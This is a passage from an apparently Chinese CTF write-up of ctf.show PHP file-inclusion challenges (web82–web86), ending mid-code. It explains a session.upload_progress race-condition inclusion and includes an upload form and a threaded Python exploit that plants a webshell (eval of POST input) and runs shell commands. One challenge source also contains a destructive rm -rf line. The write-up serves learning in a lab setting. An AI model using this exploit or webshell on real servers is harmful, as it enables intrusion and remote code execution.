class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了<code>：</code>.，用上一道的方法就可以的    </p><h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 19:34:45# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多过滤了点号<code>.</code>,这样上一道的方法就不行了，因为access.log中的<code>.</code>会被???替换，无法实现，查阅wp，使用<code>PHP_SESSION_UPLOAD_PROGRESS进行文件包含</code>，可以实现本题的解。在这里进行一个记录，主要参考文章</p><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><p><img src="/images/image-20210201095151852.png"></p><p>通过这些特性可以得出利用原理：利用<code>session.upload_progress</code>将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置，具体原理如上图红框中所示</p><p>而在php.ini有以下几个默认选项</p><pre class="line-numbers language-none"><code class="language-none">1. session.upload_progress.enabled &#x3D; on2. session.upload_progress.cleanup &#x3D; on3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>session里有一个默认选项，<strong>session.use_strict_mode</strong>默认值为off。</p><p><img src="/images/image-20210201104150935.png"></p><p><code>此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值.</code></p><p>注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session</p><p>但是<strong>session.upload_progress.cleanup</strong>默认是开启的,一旦读取了所有的post数据，他就会清除进度信息，我们使用条件竞争来进行文件上传与文件包含，在文件上传没有完成的时候进行文件包含，执行我们的恶意代码。</p><p><strong>session文件默认存储路径</strong></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sess_PHPSESSID&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>进行一个简单梳理，在进行文件上传的时候（文件内容不重要），我们同时post传入与session.upload_progress.name同名的变量（变量名默认为PHP_SESSION_UPLOAD_PROGRESS），同时，我们自行设置一个cookie，即PHPSESSID，（cookie内容不重要）这时候，PHP会生成一个与我们PHPSESSID值相关的临时文件，即/tmp/sess_flag，（字符串flag是cookie的内容，可以自行改变）该文件的内容会被写入session.upload_progress.prefix+session.upload_progress.name两变量的值，而我们将session.upload_progress.name变量的值设置为了恶意代码。再通过条件竞争的文件包含包含该文件，即可执行恶意代码</strong></p><p>接下来是本题的wp</p><p>首先建立一个文件上传，post请求的网页进行请求（这样方便点，也可以写脚本，我的python稀烂就这样做了）</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210201115408700.png"></p><p>提交抓包以后传入爆破（爆破是为了多次请求以能够条件竞争在文件上传时进行文件包含）</p><p><img src="/images/image-20210201115809630.png"></p><p>添加了cookie以及随便加了一个爆破点，因为cookie值为abc，所以知道文件包含的路径为/?file=/tmp/sess_abc，这时候再抓一个文件包含访问的包</p><p><img src="/images/image-20210201120507211.png"></p><p>同时开启爆破</p><p><img src="/images/image-20210201122536921.png"></p><p>可以看到文件包含成功了，ls出了fl0g.php，那么接下来重新修改system函数中内容为cat fl0g.php再爆破，即可得到flag</p><p><img src="/images/image-20210201122717141.png"></p><p><del>有一说一，真滴很秀这些姿势</del></p><p>除了抓包，还可以用脚本，下面是大佬们的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> <span class="token string">'http://adc556a9-c7fc-45cc-a82a-76775620e81b.chall.ctf.show/'</span>sessid <span class="token operator">=</span> <span class="token string">'vrhtvjd4j1sd88onr92fm9t2sj'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            host<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?>');echo md5('1');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">#这里的输出MD5编码的1，是用于后面读取的时候if判断是否成功成功执行了上述命令，也可以用别的方法进行判断</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># print(response.text)</span>        <span class="token keyword">if</span> <span class="token string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token comment">#这是1的MD5，如果出现，说明这一个response已经执行了我们想要的命令，</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">Warning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:28:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">session_unset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到有一点区别，就是多了session_destory()</p><p><strong>session_destroy()</strong> 销毁当前会话中的全部数据， 但是不会重置当前会话所关联的全局变量， 也不会重置会话 cookie。 如果需要再次使用会话变量， 必须重新调用 <a href="https://www.php.net/manual/zh/function.session-start.php">session_start()</a> 函数。</p><p>也就是说我们需要重新调用一次session_start()函数即可，在我们的请求页面加上即可</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://e113b1bc-28b8-4f08-9e60-b74fe3a96ef3.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--题目链接--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>123<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?phpsession_start();?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再按照上一题的方法即可解出</p><h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3> <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:40:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm -rf /tmp/*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会对tmp目录下文件进行删除，但依旧可以按照上一道的思路做，自己抓包爆破依然可以，没有受到rm -rf的影响，但肉眼可见，还是脚本更为简便，接下来还是要提升下编码能力啊</p><h3 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:59:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>file_get_contents:将整个文件读入一个字符串</li><li>strpos :查找字符串首次出现的位置</li></ul><p>要求字符<code>&lt;</code>出现的位置必须在第一个，但其实没有啥影响，用脚本依旧可以跑过。抓包也可以过，也不清楚为什么没有被限制到</p><h3 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:20:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'还要秀？'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_include_path</span><span class="token punctuation">(</span>还要秀？<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token 